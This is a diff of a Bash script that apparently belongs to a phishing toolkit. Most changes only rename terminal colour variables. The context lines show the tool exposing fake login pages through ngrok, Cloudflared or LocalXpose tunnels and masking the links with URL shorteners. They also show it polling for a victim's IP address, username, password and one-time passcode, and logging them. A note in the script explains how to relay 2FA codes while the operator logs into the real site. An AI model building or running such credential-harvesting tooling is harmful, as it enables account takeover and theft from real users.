@@ -1,25 +1,109 @@
-##COLOUR VARIABLE
+##COLOUR TEXT
+BLACK="\e[30m"
+RED="\e[31m"
+GREEN="\e[32m"
+YELLOW="\e[33m"
+BLUE="\e[34m"
+MAGENTA="\e[35m"
+CYAN="\e[36m"
+WHITE="\e[37m"
+GRAY="\e[90m"
+LRED="\e[91m"
+LGREEN="\e[92m"
+LYELLOW="\e[93m"
+LBLUE="\e[94m"
+LMAGENTA="\e[95m"
+LCYAN="\e[96m"
+NC="\e[0m" #Reset colour
 
-#Text
-RED="$(printf '\033[31m')"
-GREEN="$(printf '\033[32m')"
-ORANGE="$(printf '\033[33m')"
-BLUE="$(printf '\033[34m')"
-MAGENTA="$(printf '\033[35m')"
-CYAN="$(printf '\033[36m')"
-WHITE="$(printf '\033[37m')"
-BLACK="$(printf '\033[30m')"
-NC="$(printf '\033[0m')" #Reset colour
-#Background
-REDBG="$(printf '\033[41m')"
-GREENBG="$(printf '\033[42m')"
-ORANGEBG="$(printf '\033[43m')"
-BLUEBG="$(printf '\033[44m')"
-MAGENTABG="$(printf '\033[45m')"
-CYANBG="$(printf '\033[46m')"
-WHITEBG="$(printf '\033[47m')"
-BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '\e[0m\n')" #Reset background
+##COLOUR BG
+BLACKBG="\e[40m"
+REDBG="\e[41m"
+GREENBG="\e[42m"
+YELLOWBG="\e[43m"
+BLUEBG="\e[44m"
+MAGENTABG="\e[45m"
+CYANBG="\e[46m"
+WHITEBG="\e[47m"
+GRAYBG="\e[100m"
+LREDBG="\e[101m"
+LGREENBG="\e[102m"
+LYELLOWBG="\e[103m"
+LBLUEBG="\e[104m"
+LMAGENTABG="\e[105m"
+LCYANBG="\e[106m"
+RESETBG="\e[0m\n" #Reset background
+
+## COLOUR FONT - BOLD
+BOLDBLACK="\e[1;30m"
+BOLDRED="\e[1;31m"
+BOLDGREEN="\e[1;32m"
+BOLDYELLOW="\e[1;33m"
+BOLDBLUE="\e[1;34m"
+BOLDMAGENTA="\e[1;35m"
+BOLDCYAN="\e[1;36m"
+BOLDWHITE="\e[1;37m"
+BOLDGRAY="\e[1;90m"
+BOLDLRED="\e[1;91m"
+BOLDLGREEN="\e[1;92m"
+BOLDLYELLOW="\e[1;93m"
+BOLDLBLUE="\e[1;94m"
+BOLDLMAGENTA="\e[1;95m"
+BOLDLCYAN="\e[1;96m"
+
+## COLOUR FONT - FAINT
+FAINTBLACK="\e[2;30m"
+FAINTRED="\e[2;31m"
+FAINTGREEN="\e[2;32m"
+FAINTYELLOW="\e[2;33m"
+FAINTBLUE="\e[2;34m"
+FAINTMAGENTA="\e[2;35m"
+FAINTCYAN="\e[2;36m"
+FAINTWHITE="\e[2;37m"
+FAINTGRAY="\e[2;90m"
+FAINTLRED="\e[2;91m"
+FAINTLGREEN="\e[2;92m"
+FAINTLYELLOW="\e[2;93m"
+FAINTLBLUE="\e[2;94m"
+FAINTLMAGENTA="\e[2;95m"
+FAINTLCYAN="\e[2;96m"
+
+## COLOUR FONT - ITALIC
+ITALICBLACK="\e[3;30m"
+ITALICRED="\e[3;31m"
+ITALICGREEN="\e[3;32m"
+ITALICYELLOW="\e[3;33m"
+ITALICBLUE="\e[3;34m"
+ITALICMAGENTA="\e[3;35m"
+ITALICCYAN="\e[3;36m"
+ITALICWHITE="\e[3;37m"
+ITALICGRAY="\e[3;90m"
+ITALICLRED="\e[3;91m"
+ITALICLGREEN="\e[3;92m"
+ITALICLYELLOW="\e[3;93m"
+ITALICLBLUE="\e[3;94m"
+ITALICLMAGENTA="\e[3;95m"
+ITALICLCYAN="\e[3;96m"
+
+## COLOUR FONT - UNDERLINE
+ULBLACK="\e[4;30m"
+ULRED="\e[4;31m"
+ULGREEN="\e[4;32m"
+ULYELLOW="\e[4;33m"
+ULBLUE="\e[4;34m"
+ULMAGENTA="\e[4;35m"
+ULCYAN="\e[4;36m"
+ULWHITE="\e[4;37m"
+ULGRAY="\e[4;90m"
+ULLRED="\e[4;91m"
+ULLGREEN="\e[4;92m"
+ULLYELLOW="\e[4;93m"
+ULLBLUE="\e[4;94m"
+ULLMAGENTA="\e[4;95m"
+ULLCYAN="\e[4;96m"
+
+##RESET ALL FONT AND COLOUR
+NF="\e[0;0m" 
 
 #Directories
 pro_dir=$(pwd) #project directory
@@ -101,7 +185,7 @@ dependencies() {
         if [[ `command -v proot` ]]; then
             printf ''
         else
-                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
+                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${YELLOW}proot${CYAN}"${WHITE}
             pkg install proot resolv-conf -y
         fi
     fi
@@ -112,7 +196,7 @@ dependencies() {
                 pkgs=(php curl wget unzip)
                 for pkg in "${pkgs[@]}"; do
                         type -p "$pkg" &>/dev/null || {
-                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
+                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${YELLOW}$pkg${CYAN}"${WHITE}
                                 if [[ `command -v pkg` ]]; then
                                         pkg install "$pkg" -y
                                 elif [[ `command -v apt` ]]; then
@@ -317,7 +401,7 @@ ngrok_token_setup(){
         fi
 
 	rm -rf ${HOME}/.ngrok2/ngrok.yml
-	read -p "${RED}[${WHITE}-${RED}]${ORANGE} Enter your authtoken :" ntoken
+	read -p "${RED}[${WHITE}-${RED}]${YELLOW} Enter your authtoken :" ntoken
 	echo "authtoken : ${ntoken}" >> ngrok.yml
 	mv ngrok.yml ${HOME}/.ngrok2/
 	./.server/ngrok config upgrade
@@ -358,7 +442,7 @@ start_ngrok() {
         { sleep 1; setup_site; }
 	echo -e "\n"
 	ngrokregion="us"
-        read -p "${RED}[${WHITE}-${RED}]${GREEN} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " reply
+        read -p "${RED}[${WHITE}-${RED}]${GREEN} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${YELLOW} " reply
 	case $reply in
 	Y | y)
 		ngrok_region;;
@@ -468,9 +552,9 @@ token_localxpose() {
 	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"
 
 	[ "$(./.server/loclx account status | grep Error)" ] && {
-		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
+		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${YELLOW}localxpose.io${GREEN} & copy the token\n"
 		sleep 3
-		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx Token :${ORANGE} " loclx_token
+		read -p "${RED}[${WHITE}-${RED}]${YELLOW} Loclx Token :${YELLOW} " loclx_token
 		[[ $loclx_token == "" ]] && {
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnelmenu
 		} || {
@@ -483,7 +567,7 @@ start_loclx() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
-	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " opinion
+	read -n1 -p "${RED}[${WHITE}-${RED}]${YELLOW} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${YELLOW} " opinion
 	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
 	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."
 
@@ -651,7 +735,7 @@ cusurl(){
 	echo " "
 	echo -ne "${RED}[${WHITE}-${RED}]${GREEN} Do You want to Customize the uRL BeLow?"
 	echo " "
-	read -p "${RED}[${WHITE}-${RED}]${ORANGE} $LINK (Y/n) : ${ORANGE}" CUS_URI
+	read -p "${RED}[${WHITE}-${RED}]${YELLOW} $LINK (Y/n) : ${YELLOW}" CUS_URI
 	case $CUS_URI in
                 Y | y)
 			check_netstats
@@ -676,7 +760,7 @@ shorten_keystocks(){
 	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN}Enter Your Custom uRL (eg:https://google.com | www.google.com) : " CUS_URL
 	checkurl ${CUS_URL}
 	echo " "
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${ORANGE})${GREEN} : ${ORANGE}" Keystks #KEY_STOCKS
+	read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter Some KeyStocks (${WHITE}eg: sign-in-2FA ${YELLOW})${GREEN} : ${YELLOW}" Keystks #KEY_STOCKS
 	if [[ ${Keystks} =~ ^([0-9a-zA-Z-]*)$ ]]; then
 		shorten
 	else
@@ -695,31 +779,31 @@ checkurl() { #3 checking for HTTP|S or WWW input type is valid or not.
 check_site() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 shorten() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} SHORTENING URL : ${YELLOW} ${LINK}"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Shortening maytake some time (approx 30 seconds)"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Shortening maytake some time (approx 30 seconds)"
 	isgd="https://is.gd/create.php?format=simple&url="
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 	if [[ $(check_site $isgd) == 2* ]]; then
 		shorten_isgd $isgd "$LINK"
 	else
-		final_isgd_url="${ORANGE} Couldn't shorten this link here"
-                masked_isgd_url="${ORANGE} Couldn't mask this link here"
+		final_isgd_url="${YELLOW} Couldn't shorten this link here"
+                masked_isgd_url="${YELLOW} Couldn't mask this link here"
 	fi
 	if [[ $(check_site $shortcode) == 2* ]]; then
 		shorten_shortcode $shortcode "$LINK"
 	else
-		final_shortcode_url1="${ORANGE} Couldn't shorten this link here"
-                masked_shortcode_url1="${ORANGE} Couldn't mask this link here"
-		final_shortcode_url2="${ORANGE} Couldn't shorten this link here"
-                masked_shortcode_url2="${ORANGE} Couldn't mask this link here"
-		final_shortcode_url3="${ORANGE} Couldn't shorten this link here"
-                masked_shortcode_url3="${ORANGE} Couldn't mask this link here"
+		final_shortcode_url1="${YELLOW} Couldn't shorten this link here"
+                masked_shortcode_url1="${YELLOW} Couldn't mask this link here"
+		final_shortcode_url2="${YELLOW} Couldn't shorten this link here"
+                masked_shortcode_url2="${YELLOW} Couldn't mask this link here"
+		final_shortcode_url3="${YELLOW} Couldn't shorten this link here"
+                masked_shortcode_url3="${YELLOW} Couldn't mask this link here"
 	fi
 	if [[ $(check_site $tinyurl) == 2* ]]; then
 		shorten_tinyurl $tinyurl "$LINK"
 	else
-		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
-                masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
+		final_tinyurl_url="${YELLOW} Couldn't shorten this link here"
+                masked_tinyurl_url="${YELLOW} Couldn't mask this link here"
 	fi
 	displayshortlink
 }
@@ -744,9 +828,9 @@ shorten_shortcode() {
 shorten_tinyurl() {
 	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
 	if [ $link_tinyurl=="" ]; then
-		processed_tinyurl_url="${ORANGE} Couldn't shorten this link here"
-		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
-		masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
+		processed_tinyurl_url="${YELLOW} Couldn't shorten this link here"
+		final_tinyurl_url="${YELLOW} Couldn't shorten this link here"
+		masked_tinyurl_url="${YELLOW} Couldn't mask this link here"
 	else
 		processed_tinyurl_url=${link_tinyurl#http*//}
 		final_tinyurl_url="https://$processed_tinyurl_url"
@@ -798,7 +882,7 @@ capture_data_check(){
 
 ## Print data no otp
 capture_data_1() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
 	while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -809,7 +893,7 @@ capture_data_1() {
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !"
                         capture_id
 			capture_pass
-			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                 fi
                 sleep 0.75
 	done
@@ -817,7 +901,7 @@ capture_data_1() {
 
 ## Print data otp
 capture_data_2() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
 	while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -827,13 +911,13 @@ capture_data_2() {
                 if [[ -e ".server/www/usernames.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
                         capture_id
-			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP>"
 			echo -ne "\n${WHITE} NOTE : OTP will only be sent to victim when you login to offical website"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
                         capture_otp
-			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
                 fi
                 sleep 0.75
 	done
@@ -841,7 +925,7 @@ capture_data_2() {
 
 ## Print data notp & otp
 capture_data_3() {
-        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+        echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit..."
 	while true; do
                 if [[ -e ".server/www/ip.txt" ]]; then
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -852,13 +936,13 @@ capture_data_3() {
                         echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!!"
                         capture_id
 			capture_pass
-			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for OTP>"
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for OTP>"
                         echo -ne "\n${WHITE} NOTE : OTP WON'T BE SENT AUTOMATICALLY, ONCE YOU LOGIN IN OFFICAL WEBSITE, THAT OTP WILL BE SENT TO VICTIM"
                 fi
 		if [[ -e ".server/www/otp.txt" ]]; then
 			echo -ne "\n\n${GREEN} OTP Found !"
 			capture_otp
-			echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+			echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for Next Login Info, ${BLUE}Ctrl + C ${YELLOW}to exit. "
 		fi
                 sleep 0.75
 	done
@@ -962,7 +1046,7 @@ capture_id() {
 	echo "${MAGENTABG}${BLACK}"
         cat .server/www/usernames.txt
 	echo "${RESETBG}${NC}"
-        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+        echo -e "${GREEN} Saved in : ${YELLOW}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> "logs/${log_name}.txt"
         cat .server/www/usernames.txt >> "logs/${log_name}.txt"
 	rm -rf .server/www/usernames.txt
@@ -973,7 +1057,7 @@ capture_pass() {
 	echo "${MAGENTABG}${BLACK}"
 	cat  .server/www/pass.txt
 	echo "${RESETBG}${NC}"
-        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+        echo -e "${GREEN} Saved in : ${YELLOW}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/pass.txt >> logs/${log_name}.txt
 	rm -rf .server/www/pass.txt
@@ -984,7 +1068,7 @@ capture_otp() {
 	echo "${MAGENTABG}${BLACK}"
         cat  .server/www/otp.txt
 	echo "${RESETBG}${NC}"
-        echo -e "${GREEN} Saved in : ${ORANGE}/logs/${log_name}.txt"
+        echo -e "${GREEN} Saved in : ${YELLOW}/logs/${log_name}.txt"
 	cat .server/dumps/space.txt >> logs/${log_name}.txt
         cat .server/www/otp.txt >> logs/${log_name}.txt
 	rm -rf .server/www/otp.txt
@@ -1020,10 +1104,10 @@ logs_menu() {
 clear
 banner
 echo -e " "
-echo -e "${RED}[${WHITE}01${RED}]${ORANGE} View Logs    "
-echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Open Logs   "
-echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Reset Logs  "
-echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Back to Tunnel menu   "
+echo -e "${RED}[${WHITE}01${RED}]${YELLOW} View Logs    "
+echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Open Logs   "
+echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Reset Logs  "
+echo -e "${RED}[${WHITE}04${RED}]${YELLOW} Back to Tunnel menu   "
 read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a choice : ${BLUE}" reply_logs_menu
 
         case $reply_logs_menu in
@@ -1062,10 +1146,10 @@ tunnelmenu() {
 clear
 banner
 echo -e " "
-echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Localhost    ${RED}[${CYAN}For Devs${RED}]"
-echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
-echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
-echo -e "${RED}[${WHITE}04${RED}]${ORANGE} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
+echo -e "${RED}[${WHITE}01${RED}]${YELLOW} Localhost    ${RED}[${CYAN}For Devs${RED}]"
+echo -e "${RED}[${WHITE}02${RED}]${YELLOW} Ngrok.io     ${RED}[${CYAN}Need to create account${RED}]"
+echo -e "${RED}[${WHITE}03${RED}]${YELLOW} Cloudflared  ${RED}[${CYAN}Auto Detects${RED}]"
+echo -e "${RED}[${WHITE}04${RED}]${YELLOW} LocalXpose   ${RED}[${CYAN}Max 15 mins${RED}]"
 
         read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
